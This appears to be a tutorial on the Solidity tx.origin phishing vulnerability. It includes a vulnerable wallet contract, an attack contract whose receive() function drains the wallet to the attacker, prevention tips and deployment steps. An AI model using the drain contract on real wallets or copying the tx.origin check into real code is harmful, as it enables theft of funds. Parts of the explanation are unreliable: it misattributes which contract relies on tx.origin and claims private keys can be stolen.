# What is Tx Origin Attack?
A "Tx Origin Attack" in the context of blockchain and smart contracts occurs when an attacker deploys a malicious contract disguised as a regular wallet. This malicious contract, when funded by the owner of a vulnerable smart contract, deceives the owner into thinking they are performing actions only the owner should be able to do. The attacker exploits the tx.origin variable, which initially appears to represent the owner's externally owned account (EOA). However, the attacker's contract uses this deceptive information to carry out unauthorized actions, potentially leading to the theft of funds, private keys, or other sensitive data. To prevent such attacks, it is crucial for developers to use msg.sender for access control within smart contracts and for users to exercise caution when interacting with unfamiliar contracts.

```solidity 

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
// phishing with tx.origin

contract txorigin_wallet{
    address public owner;

    constructor(){
         owner = msg.sender;
    }

    function deposit() public payable{
    }

    function transfer(address payable to, uint amt) public{
         require(tx.origin == owner, "Not the owner");
         (bool sent, ) = to.call{value: amt}("");
        require(sent, "failed to send ether");
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}


``` 



# How does it happen?
A "tx.origin" attack is a security vulnerability in smart contracts on blockchains like Ethereum. It happens when a malicious contract relies on the "tx.origin" variable to identify the original sender of a transaction. An attacker lures a user into interacting with their malicious contract, and if that user interacts with the attacker's contract while originating from a different contract, the attacker's contract can be tricked into thinking the user is someone else, potentially leading to unauthorized actions or loss of funds. To mitigate such attacks, developers are advised to use the more secure msg.sender variable instead of tx.origin when determining the sender of a transaction within their smart contracts, as msg.sender always represents the immediate sender of the transaction and cannot be as easily manipulated or spoofed.

# Example of Tx Origin Attack.
Here is an example code for tx origin attack.

```solidity 

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
// phishing with tx.origin

interface Itxorigin{
       function transfer(address payable to, uint amt) external;
       function getBalance() external view returns (uint);       
}

contract attacktxorigin{
         address public owner;
         Itxorigin public immutable mytxorigin;

        constructor (address  addr){
            mytxorigin = Itxorigin(addr);
            owner = msg.sender;
         }

        receive() external payable {
                      mytxorigin.transfer(payable(owner), mytxorigin.getBalance());
        }                     
}


``` 


# How to prevent?
- Never use tx.origin to check for authorisation of ownership, instead use msg.sender
- Don’t use address.call.value(amount)(); instead use address.transfer()
address.transfer() will have a gas stipend of 2300 — meaning possible attacking contracts would not have enough gas for further computation other than emitting Events

# How to use our code: 
- First you need to deploy the txorigin_wallet contract. You can perform deposit and balance check operation here.
- Then you deploy the attacktxorigin contact.
- Using owner account you try to transfer an amojnt to another address. That address will be the owner and transfer all the money from smart conrtact to its own account.
